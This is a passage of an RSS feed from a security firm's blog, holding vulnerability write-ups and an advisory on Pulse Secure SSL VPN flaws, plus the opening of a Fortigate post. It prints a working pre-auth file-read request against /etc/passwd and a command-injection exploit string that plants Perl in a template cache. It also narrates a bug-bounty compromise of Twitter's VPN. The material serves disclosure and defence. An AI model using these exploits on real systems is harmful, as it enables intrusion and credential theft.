&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;

&lt;p&gt;And itâ€™s worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;

&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;

&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didnâ€™t find a way to exploit it, so he didnâ€™t report to the vendor.&lt;/p&gt;

&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;

&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$TCPDUMP_COMMAND -d $options &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Itâ€™s so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;

&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backtick&lt;/code&gt;â€¦&lt;/p&gt;

&lt;p&gt;This module is called &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;

&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;

&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we canâ€™t generate a valid Perl script still bothered us.&lt;/p&gt;

&lt;p&gt;We got stuck here, and itâ€™s time to think out of the box. Itâ€™s hard to generate a valid Perl script via &lt;code class=&quot;highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It seems we can â€œ&lt;strong&gt;partially&lt;/strong&gt;â€ control the error message. Then we tried the filename &lt;code class=&quot;highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt;
  tcpdump: print 123#: No such file or directory
 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl â€“
  123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, letâ€™s have a Perl 101 lesson now!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;

&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$x=&quot;ls /&quot;,system$x#&#39;&lt;/span&gt;
 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the generated &lt;code class=&quot;highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;

&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;

&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, itâ€™s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;

&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still canâ€™t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Donâ€™t share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;

&lt;p&gt;Due to this â€œ&lt;strong&gt;convenient&lt;/strong&gt;â€ feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. Itâ€™s the restricted management interface!&lt;/p&gt;

&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the â€œ&lt;strong&gt;WebVPN&lt;/strong&gt;â€ feature! WebVPN is a proxy which helps to connect to anywhere. So, letâ€™s connect to itself.&lt;/p&gt;

&lt;p&gt;Yes, itâ€™s SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didnâ€™t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so thatâ€™s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so itâ€™s hard to get the managerâ€™s plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, â€¦))&lt;/code&gt; formatâ€¦&lt;/p&gt;

&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. Soâ€¦&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The managerâ€™s password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. Itâ€™s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;

&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;

&lt;p&gt;The first is the Client-Side Certificate. Itâ€™s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;

&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendorâ€™s security advisory. The most important of all, always keep your system updated!&lt;/p&gt;

&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;

&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, letâ€™s talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;

&lt;p&gt;During our research, we found a new attack vector to take over all the clients. Itâ€™s the â€œ&lt;strong&gt;logon script&lt;/strong&gt;â€ feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secureâ€¦ and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;

&lt;p&gt;Due to this â€œ&lt;strong&gt;hacker-friendly&lt;/strong&gt;â€ feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;

&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pulse Secure SSL VPN è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘å° Pulse Secure SSL VPN çš„å®‰å…¨ç ”ç©¶ä¸­ï¼Œå…±ç™¼ç¾äº†ä¸‹åˆ—ä¸ƒå€‹å¼±é»ã€‚çµ„åˆåˆ©ç”¨æœ‰æ©Ÿæœƒå–å¾— SSL VPN è¨­å‚™çš„æœ€é«˜æ¬Šé™ï¼Œå¯è®“æ”»æ“Šè€…é€²å…¥ç”¨æˆ¶å…§ç¶²ï¼Œç”šè‡³æ§åˆ¶æ¯å€‹é€é SSL VPN é€£ç·šçš„ä½¿ç”¨è€…è£ç½®ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å—å½±éŸ¿çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›®å‰å·²ç¶“å‡ºç¾æ”»æ“Šè€…å°å…¨ä¸–ç•Œè¨­å‚™é€²è¡Œå¤§è¦æ¨¡æƒæï¼Œè«‹ Pulse Secure SSL VPN ç”¨æˆ¶&lt;strong&gt;å„˜é€Ÿæ›´æ–°&lt;/strong&gt;ï¼Œéœ€è¦æ›´æ–°çš„ç‰ˆæœ¬è³‡æºå¯åƒè€ƒ&lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101&quot;&gt;åŸå»  Pulse Secure çš„å…¬å‘Š&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;ç›®å‰äº¦ç™¼ç¾æ”»æ“Šè€…å°æˆ‘å€‘ä¹‹å‰ç™¼è¡¨çš„ &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;Fortigate SSL VPN&lt;/a&gt; åŠ &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt; å¼±é»é€²è¡Œå¤§è¦æ¨¡æƒæï¼Œå†æ¬¡æé†’è«‹ç”¨æˆ¶å„˜é€Ÿæ›´æ–°ä»¥ä¸Š SSL VPN è¨­å‚™è‡³æœ€æ–°ç‰ˆã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory</guid>
                <pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
                <description>&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
  &lt;li&gt;and more â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;lets-start&quot;&gt;Letâ€™s start!&lt;/h1&gt;

&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;

&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;

&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

